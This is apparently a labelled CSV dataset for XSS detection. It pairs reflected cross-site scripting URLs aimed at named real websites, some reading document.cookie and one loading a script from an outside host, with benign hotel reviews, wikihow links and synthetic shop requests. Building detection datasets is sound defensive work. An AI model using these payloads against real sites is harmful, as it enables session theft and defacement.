Payloads,Class,decoded,executed,parser_changed
http://www.spielaffe.de/account/remote_login?user[auth_username]='&quot;&gt;&lt;script&gt;alert(navigator.useragen<br>t)&lt;/script&gt;&amp;layout=window,Malicious,"http://www.spielaffe.de/account/remote_login?user[auth_username]='""><script>alert(navigator.useragent)</script>&layout=window",True,True
https://rbslynk.trustwave.com/getdur.php?c=10&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;,Malicious,"https://rbslynk.trustwave.com/getdur.php?c=10""><script>alert('xss')</script>",True,True
http://performanceforcharity.net/u.asp?u=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://performanceforcharity.net/u.asp?u=""><script>alert(""maxwel"")</script>",True,True
http://stock.yahoo.co.kr/st2/st15/st1502/st15020301.html?id=1424606&amp;start=%22%3e%3cscript%3ealert%28<br>%2fwww.r3t.n3t.nl%2f%29%3c%2fscript%3e,Malicious,"http://stock.yahoo.co.kr/st2/st15/st1502/st15020301.html?id=1424606&start=""><script>alert(/www.r3t.n3t.nl/)</script>",True,True
http://www.kurucasile.net/galeri/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.kurucasile.net/galeri/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.oyunindir.com.tr/search.php?game==&lt;script&gt;alert(&quot;pyske&quot;)&lt;/script&gt;,Malicious,"http://www.oyunindir.com.tr/search.php?game==<script>alert(""pyske"")</script>",True,True
http://www.wikihow.com/customize-ubuntu-windows-style&t=1396610599498&n=4721442&k=mainentity,Benign,http://www.wikihow.com/customize-ubuntu-windows-style&t=1396610599498&n=4721442&k=mainentity,False,False
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mahlen&password=p7r7t05nico&nombre=vito&apellidos=madue%f1o+o%27neil&email=dolitzkaya_sali%40coreserv.ar&dni=26506655y&direccion=pla%e7a+torras+i+bages+17%2c+&ciudad=abaltzisketa&cp=28991&provincia=valladolid&ntc=2767737308200110&b1=registrar,Benign,"http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mahlen&password=p7r7t05nico&nombre=vito&apellidos=madue�o o'neil&email=dolitzkaya_sali@coreserv.ar&dni=26506655y&direccion=pla�a torras i bages 17, &ciudad=abaltzisketa&cp=28991&provincia=valladolid&ntc=2767737308200110&b1=registrar",False,False
http://www.youareblocked.net/index.php?user=&quot;&gt;&lt;script&gt;alert(/fuck/)&lt;/script&gt;&amp;pass=&quot;&gt;&lt;script&gt;alert(/f<br>uck/)&lt;/script&gt;&amp;recom=1&amp;submit=&quot;&gt;&lt;script&gt;alert(/fuck/)&lt;/script&gt;,Malicious,"http://www.youareblocked.net/index.php?user=""><script>alert(/fuck/)</script>&pass=""><script>alert(/fuck/)</script>&recom=1&submit=""><script>alert(/fuck/)</script>",True,True
http://www.devon.gov.uk/atoz.htm?letter=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/<br>h1&gt;&lt;/marquee&gt;,Malicious,"http://www.devon.gov.uk/atoz.htm?letter=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.toolbarn.com/cgi-bin/search.cgi?search_for=test&amp;dom=%22%3e%3cscript%3ealert%28document%2e<br>cookie%29%3c%2fscript%3e,Malicious,"http://www.toolbarn.com/cgi-bin/search.cgi?search_for=test&dom=""><script>alert(document.cookie)</script>",True,True
http://www.wikihow.com/buy-a-fruit-basket&t=1396546663905&n=1718152&k=mainentity,Benign,http://www.wikihow.com/buy-a-fruit-basket&t=1396546663905&n=1718152&k=mainentity,False,False
http://www.albeda.nl/deelnemer/zoeken.cfm?search=%22%3e%3cscript%3ealert%20%28%27killer-tr%20ownz!%2<br>7%29%3c/script%3e%3ciframe+src%3dhttp%3a%2f%2fi43.tinypic.com/2lksbgo.png%3e&amp;x=0&amp;y=0,Malicious,"http://www.albeda.nl/deelnemer/zoeken.cfm?search=""><script>alert ('killer-tr ownz!')</script><iframe src=http://i43.tinypic.com/2lksbgo.png>&x=0&y=0",True,True
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dehghan&pwd=f22jenco&remember=off&b1=entrar,Benign,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dehghan&pwd=f22jenco&remember=off&b1=entrar,False,False
http://www.canael.co.jp/a-news.cgi?date=2007.10.31&amp;cal=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65<br>%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%<br>31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%3<br>6%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious,"http://www.canael.co.jp/a-news.cgi?date=2007.10.31&cal="">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
",True,True
"beware non existant weekend specials showreview(1025525, 'full');",Benign,"beware non existant weekend specials showreview(1025525, 'full');",False,False
http://starbeam.jpl.nasa.gov/tools/data_dictionary_lookup.cfm?obj=y&amp;search_field=%3cscript%3ealert(%<br>27al3m%27)%3c%2fscript%3e&amp;submit=search,Malicious,http://starbeam.jpl.nasa.gov/tools/data_dictionary_lookup.cfm?obj=y&search_field=<script>alert('al3m')</script>&submit=search,True,True
http://www.armagh.gov.uk/news.php?show_sub=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.armagh.gov.uk/news.php?show_sub=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://32.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://32.911-job.ru/az.php?zc=""><script>alert(""maxwel"")</script>",True,True
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7183&b1=pasar+por+caja,Benign,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7183&b1=pasar por caja,False,False
http://www.wikihow.com/make-yourself-look-fancy&t=1396518048354&n=355874&k=mainentity,Benign,http://www.wikihow.com/make-yourself-look-fancy&t=1396518048354&n=355874&k=mainentity,False,False
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=burek&password=y9n14&nombre=florindo&apellidos=acero+parad%eds&email=caba.colley%40grandesinventos.mil&dni=82294376p&direccion=c%2f+san+serapio%2c+16%2c+&ciudad=bosque%2c+el&cp=49699&provincia=c%e1diz&ntc=6972372814690383&b1=registrar,Benign,"http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=burek&password=y9n14&nombre=florindo&apellidos=acero parad�s&email=caba.colley@grandesinventos.mil&dni=82294376p&direccion=c/ san serapio, 16, &ciudad=bosque, el&cp=49699&provincia=c�diz&ntc=6972372814690383&b1=registrar",False,False
http://www.istituticulturali.it/moduli/news/news.jsp?sn=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.istituticulturali.it/moduli/news/news.jsp?sn=""><script>alert(""maxwel"")</script>",True,True
"affordable and well located our room was clean and included free high speed internet. the hotel is well located with a free shuttle to universal studios, and short drives to grauman's chinese theatre and the walk of fame, about 1/2 hour from lax and a quick drive to warner brothers studio.the beds were comfortable, our room was quiet, although a bit small for four adults.",Benign,"affordable and well located our room was clean and included free high speed internet. the hotel is well located with a free shuttle to universal studios, and short drives to grauman's chinese theatre and the walk of fame, about 1/2 hour from lax and a quick drive to warner brothers studio.the beds were comfortable, our room was quiet, although a bit small for four adults.",False,False
http://www.wikihow.com/prepare-for-aluminum-fence-installation&t=1396563527699&n=2618758&k=mainentity,Benign,http://www.wikihow.com/prepare-for-aluminum-fence-installation&t=1396563527699&n=2618758&k=mainentity,False,False
http://www.familyparkworld.com/select.asp?type=familyguy&amp;season=1&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;,Malicious,"http://www.familyparkworld.com/select.asp?type=familyguy&season=1""><script>alert(123)</script>",True,True
http://www.supererotikshop.com/shop/default.asp?gb=urun&amp;id=293&amp;ortak=%22%3e%3cscript%3ealert(%22back<br>door%22)%3c/script%3e,Malicious,"http://www.supererotikshop.com/shop/default.asp?gb=urun&id=293&ortak=""><script>alert(""backdoor"")</script>",True,True
entrar&login=brain&pwd=c7%f1ada98o&remember=on&b1=entrar,Benign,entrar&login=brain&pwd=c7�ada98o&remember=on&b1=entrar,False,False
http://65.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://65.911-job.ru/az.php?zc=""><script>alert(""maxwel"")</script>",True,True
overbooking! we had a lot of problems finding a hotel in san fran for the particular night we were staying there due to a major convention in town. we were supposed to be traveling the week before but my husbands business trip got moved and we had to change the,Benign,overbooking! we had a lot of problems finding a hotel in san fran for the particular night we were staying there due to a major convention in town. we were supposed to be traveling the week before but my husbands business trip got moved and we had to change the,False,False
"nice hotel, friendly service, great location, nice food another view out our window",Benign,"nice hotel, friendly service, great location, nice food another view out our window",False,False
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shirline5&password=pane4&nombre=eladio&apellidos=licandro+deza&email=rosamond_aloyshina%40videospornocaseros.aq&dni=06384093y&direccion=ruela+de+altamira+97+&ciudad=ojacastro&cp=50219&provincia=baleares+%28illes%29&ntc=3455767132953142&b1=registrar,Benign,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shirline5&password=pane4&nombre=eladio&apellidos=licandro deza&email=rosamond_aloyshina@videospornocaseros.aq&dni=06384093y&direccion=ruela de altamira 97 &ciudad=ojacastro&cp=50219&provincia=baleares (illes)&ntc=3455767132953142&b1=registrar,False,False
http://ymobileblog.com/blog/?s=+}%3c%2fstyle%3e%3cscript%3ea%3deval%3bb%3dalert%3ba%28b%28%2fxss%2f.source%29%29%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss3d+by+hari%28topsecure.net%29%3c%2fh1%3e%3c%2fmarquee%3e,Malicious,"http://ymobileblog.com/blog/?s= }</style><script>a=eval;b=alert;a(b(/xss/.source));</script><marquee bgcolor=""red""><h1>xss3d by hari(topsecure.net)</h1></marquee>",True,True
http://www.wikihow.com/avoid-appliance-repair&t=1396562277318&n=2537972&k=mainentity,Benign,http://www.wikihow.com/avoid-appliance-repair&t=1396562277318&n=2537972&k=mainentity,False,False
http://www.hr.gov.cn/search.php?searchword=&quot;&gt;&lt;script&gt;alert(/ar3sw0rmed/);&lt;/script&gt;,Malicious,"http://www.hr.gov.cn/search.php?searchword=""><script>alert(/ar3sw0rmed/);</script>",True,True
http://www.agence-rci.com/index.php?lang=fr/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious,"http://www.agence-rci.com/index.php?lang=fr/""><script>alert('xss by atm0n3r')</script>",True,True
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sheelagh&password=rehin3hir&nombre=heraldo&apellidos=gonyalon+salobre%f1a&email=goertz%40satellites.st&dni=71658245c&direccion=c%2f+luis+llorente%2c+s%2fn%2c+11%3fg&ciudad=lorqu%ed&cp=10883&provincia=valencia&ntc=7089450300383912&b1=registrar,Benign,"http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sheelagh&password=rehin3hir&nombre=heraldo&apellidos=gonyalon salobre�a&email=goertz@satellites.st&dni=71658245c&direccion=c/ luis llorente, s/n, 11?g&ciudad=lorqu�&cp=10883&provincia=valencia&ntc=7089450300383912&b1=registrar",False,False
"ok for what it is the only reason to stay at this hotel is if you have a flight early the next day or got stranded because of a cancelled flight. having said that, it was perfectly adequate. they have a free shuttle to the airport available 24 hours a day, a microwave in the room, an ok breakfast spread starting before 5am, internet access, an outdoor pool and the staff was perfectly pleasant. the air conditioner rattled little and it was a little difficult to find the place (there's a 47th street right next to 47th place) but the room was clean enough and they got us to the airport on time. this is the low end of the choice chain, so don't expect it to really be a three-star hotel. it's just a place to sleep. if you are catching a plane in the morning and have a rental car, i suggest you head down university to mills ave. near the asu campus--lots of restaurants, stores and people.",Benign,"ok for what it is the only reason to stay at this hotel is if you have a flight early the next day or got stranded because of a cancelled flight. having said that, it was perfectly adequate. they have a free shuttle to the airport available 24 hours a day, a microwave in the room, an ok breakfast spread starting before 5am, internet access, an outdoor pool and the staff was perfectly pleasant. the air conditioner rattled little and it was a little difficult to find the place (there's a 47th street right next to 47th place) but the room was clean enough and they got us to the airport on time. this is the low end of the choice chain, so don't expect it to really be a three-star hotel. it's just a place to sleep. if you are catching a plane in the morning and have a rental car, i suggest you head down university to mills ave. near the asu campus--lots of restaurants, stores and people.",False,False
http://www.thelist.tas.gov.au/listmap/listmapresults.jsp;&lt;script&gt;alert(123)&lt;/script&gt;,Malicious,http://www.thelist.tas.gov.au/listmap/listmapresults.jsp;<script>alert(123)</script>,True,True
http://www.immobiliere-capyvelines.fr/index.php?lang=fr/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious,"http://www.immobiliere-capyvelines.fr/index.php?lang=fr/""><script>alert('xss by atm0n3r')</script>",True,True
http://www.evolootion.ch/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backd<br>oor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.evolootion.ch/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
"Best Staff but still a few kinks We picked the Arctic Club because it is walking distance to Safeco field.Arrived on the Cherry Street entrance. Check-in was easy and we went to our room. Still just one elevator under construction but it wasn't not too long to wait. The room was nicely appointed and well cleaned. We collapsed on the wonderfully inviting king sized bed and got rested up.We ate at Juno for dinner. Appetizers were excellent and well presented. The price was quite reasonable $5-$6. The Entrees were in the $20-$30 price range and included interesting choices such as lamb and pork loin. Excellent service.That night we placed our room service breakfast selection and went to bed. The street noise on 3rd was really bothersome. Perhaps better windows would help but the bus stop is just in front (which is convenient during the day but irritating during the night) and it was noisy all night long. Our wake up call was a real person...nice touch. The first one in the shower had hot water...the second shower was luke warm. The third shower was cool. The bathroom lighting is very dim....good ambience but not so good for make-up. About 30 minutes before we had to leave in the morning our room service had not arrived so we dashed down to Juno for breakfast. We told them we were in a hurry and our order came out in about 5 minutes! The great staff made it work. The breakfast ran around $13.00 for the hearty meat, eggs and potatoes but the steel cut oatmeal was only $5.00 and delicious. They serve Starbucks coffee and that is always a HUGE benefit.There is a fareless zone for the bus so we rode all over the city and were dropped back at the hotel without any expense. I decided to soak in the jetted tub and again I had luke warm water. The jets were powerful, in fact the intake screen sucked my hand up against it and took off some skin.....be careful.We must have adapted to the noise because we all slept better the second night. Our breakast came right on time...at least part of it. Only one entree was delivered and we were assured the others would be along in 10 minutes. (It was 90 minutes later but we had fallen back to sleep and didn't miss it.) They have a very good work out room with up to ",Benign,"Best Staff but still a few kinks We picked the Arctic Club because it is walking distance to Safeco field.Arrived on the Cherry Street entrance. Check-in was easy and we went to our room. Still just one elevator under construction but it wasn't not too long to wait. The room was nicely appointed and well cleaned. We collapsed on the wonderfully inviting king sized bed and got rested up.We ate at Juno for dinner. Appetizers were excellent and well presented. The price was quite reasonable $5-$6. The Entrees were in the $20-$30 price range and included interesting choices such as lamb and pork loin. Excellent service.That night we placed our room service breakfast selection and went to bed. The street noise on 3rd was really bothersome. Perhaps better windows would help but the bus stop is just in front (which is convenient during the day but irritating during the night) and it was noisy all night long. Our wake up call was a real person...nice touch. The first one in the shower had hot water...the second shower was luke warm. The third shower was cool. The bathroom lighting is very dim....good ambience but not so good for make-up. About 30 minutes before we had to leave in the morning our room service had not arrived so we dashed down to Juno for breakfast. We told them we were in a hurry and our order came out in about 5 minutes! The great staff made it work. The breakfast ran around $13.00 for the hearty meat, eggs and potatoes but the steel cut oatmeal was only $5.00 and delicious. They serve Starbucks coffee and that is always a HUGE benefit.There is a fareless zone for the bus so we rode all over the city and were dropped back at the hotel without any expense. I decided to soak in the jetted tub and again I had luke warm water. The jets were powerful, in fact the intake screen sucked my hand up against it and took off some skin.....be careful.We must have adapted to the noise because we all slept better the second night. Our breakast came right on time...at least part of it. Only one entree was delivered and we were assured the others would be along in 10 minutes. (It was 90 minutes later but we had fallen back to sleep and didn't miss it.) They have a very good work out room with up to ",False,False
http://support.commandcentral.com.au/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr<br>.com/chat/c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(d<br>ocument.cookie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,Malicious,"http://support.commandcentral.com.au/index.php?<script language=""javascript"" src=""http://kabustr.com/chat/c.js"" type=""text/javascript"">kabus-kabustr.com-kabus-kabustr.com</script><script>alert(document.cookie);</script><script>alert(/kabus/);</script>",True,True
registro&login=lock&password=or5ina8ia&nombre=mae&apellidos=velichcanich+pairot&email=pente%40maxitienda.ms&dni=00033926r&direccion=calle+cierzo+126+&ciudad=ob%f3n&cp=06196&provincia=%c1lava&ntc=5658181511648002&b1=registrar,Benign,registro&login=lock&password=or5ina8ia&nombre=mae&apellidos=velichcanich pairot&email=pente@maxitienda.ms&dni=00033926r&direccion=calle cierzo 126 &ciudad=ob�n&cp=06196&provincia=�lava&ntc=5658181511648002&b1=registrar,False,False
http://som1.umaryland.edu/share_edited.asp?url=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,http://som1.umaryland.edu/share_edited.asp?url=<script>alert(document.cookie)</script>,True,True
http://www.wikihow.com/buy-a-horse-shampoo&t=1396526892925&n=806868&k=mainentity,Benign,http://www.wikihow.com/buy-a-horse-shampoo&t=1396526892925&n=806868&k=mainentity,False,False
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=85&cantidad=46&b1=a%f1adir+al+carrito,Benign,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino rioja&precio=85&cantidad=46&b1=a�adir al carrito,False,False
http://www.wikihow.com/enjoy-royal-bread&t=1396594891234&n=3953295&k=mainentity,Benign,http://www.wikihow.com/enjoy-royal-bread&t=1396594891234&n=3953295&k=mainentity,False,False
http://workflow.ecc-astdinstitute.org/index.cfm?sc=&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;,Malicious,"http://workflow.ecc-astdinstitute.org/index.cfm?sc=</textarea>'""><script>alert(document.cookie)</script>",True,True
http://enable.nat.gov.tw/valid.jsp?category=testicles%22%3ea%3c/a%3e%3cscript%3ealert(document.cooki<br>e);%3c/script%3e,Malicious,"http://enable.nat.gov.tw/valid.jsp?category=testicles"">a</a><script>alert(document.cookie);</script>",True,True
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=794&b1=confirmar,Benign,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=794&b1=confirmar,False,False
http://www.wikihow.com/delete-forwards-on-a-macbook&t=1396533249208&n=1105013&k=mainentity,Benign,http://www.wikihow.com/delete-forwards-on-a-macbook&t=1396533249208&n=1105013&k=mainentity,False,False
http://channels.netscape.com/pf/lookup.jsp?issuetype=1005&amp;nameorts=1&amp;lookupvalue=%3cscript%3ealert%2<br>8%22xss | hexspirit%22%29%3c%2fscript%3e,Malicious,"http://channels.netscape.com/pf/lookup.jsp?issuetype=1005&nameorts=1&lookupvalue=<script>alert(""xss | hexspirit"")</script>",True,True
"function require_once(filename) { // http://kevin.vanzonneveld.net // + original by: michael white (http://getsprink.com) // + input by: brett zamir (http://brett-zamir.me) // + bugfixed by: kevin van zonneveld (http://kevin.vanzonneveld.net) // + bugfixed by: brett zamir (http://brett-zamir.me) // \% note 1: uses global: php_js to keep track of included files (though private static variable in namespaced version) // - depends on: require // * example 1: require_once(\'http://www.phpjs.org/js/phpjs/_supporters/pj_test_supportfile_2.js\'); // * returns 1: true var cur_file = {}; cur_file[this.window.location.href] = 1; // save include state for reference by include_once and require_once() // begin static try { // we can\'t try to access on window, since it might not exist in some environments, and if we use \""this.window\"" // we risk adding another copy if different window objects are associated with the namespaced object php_js_shared; // will be private static variable in namespaced version or global in non-namespaced // version since we wish to share this across all instances } catch (e) { php_js_shared = {}; } // end static if (!php_js_shared.includes) { php_js_shared.includes = cur_file; } if (!php_js_shared.includes[filename]) { if (this.require(filename)) { return true; } } else { return true; } return false;}'",Benign,"function require_once(filename) { // http://kevin.vanzonneveld.net //   original by: michael white (http://getsprink.com) //   input by: brett zamir (http://brett-zamir.me) //   bugfixed by: kevin van zonneveld (http://kevin.vanzonneveld.net) //   bugfixed by: brett zamir (http://brett-zamir.me) // \% note 1: uses global: php_js to keep track of included files (though private static variable in namespaced version) // - depends on: require // * example 1: require_once(\'http://www.phpjs.org/js/phpjs/_supporters/pj_test_supportfile_2.js\'); // * returns 1: true var cur_file = {}; cur_file[this.window.location.href] = 1; // save include state for reference by include_once and require_once() // begin static try { // we can\'t try to access on window, since it might not exist in some environments, and if we use \""this.window\"" // we risk adding another copy if different window objects are associated with the namespaced object php_js_shared; // will be private static variable in namespaced version or global in non-namespaced // version since we wish to share this across all instances } catch (e) { php_js_shared = {}; } // end static if (!php_js_shared.includes) { php_js_shared.includes = cur_file; } if (!php_js_shared.includes[filename]) { if (this.require(filename)) { return true; } } else { return true; } return false;}'",False,False
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mccrain&pwd=ra5h7l&remember=on&b1=entrar,Benign,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mccrain&pwd=ra5h7l&remember=on&b1=entrar,False,False
http://www.arkcity.org/index.asp?nid=-404&amp;badlink=/index.asp?id=228&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;'&quot;&gt;&lt;marquee&gt;&lt;h1&gt;mystick&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.arkcity.org/index.asp?nid=-404&badlink=/index.asp?id=228""><script>alert(document.cookie)</script>'""><marquee><h1>mystick</h1></marquee>",True,True
http://ml-st.com/fnv/xqp09/?media=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/script%3e,Malicious,"http://ml-st.com/fnv/xqp09/?media=""><script>alert(""maxwel"")</script>",True,True
http://login.kataweb.it/registrazione/newsletter/privato.jsp?origin=%22%3e%3cscript%3ealert%28%2fxss<br>+by+redtuning%2f%29%3b%3c%2fscript%3e,Malicious,"http://login.kataweb.it/registrazione/newsletter/privato.jsp?origin=""><script>alert(/xss by redtuning/);</script>",True,True
http://www.classadsuk.com/loginform.php?loc=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.classadsuk.com/loginform.php?loc=""><script>alert(document.cookie)</script>",True,True
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=louiqa&password=tiznada&nombre=leig&apellidos=so%f1ora+su%e1rez&email=zavialova.jarett%40caspospas.ar&dni=62509431p&direccion=paseo+bomba+de+la%2c+93+&ciudad=velasc%e1lvaro&cp=40465&provincia=tarragona&ntc=8239878600110127&b1=registrar,Benign,"http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=louiqa&password=tiznada&nombre=leig&apellidos=so�ora su�rez&email=zavialova.jarett@caspospas.ar&dni=62509431p&direccion=paseo bomba de la, 93 &ciudad=velasc�lvaro&cp=40465&provincia=tarragona&ntc=8239878600110127&b1=registrar",False,False
http://www.iste.org/template.cfm?section=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.iste.org/template.cfm?section=""><script>alert(""maxwel"")</script>",True,True
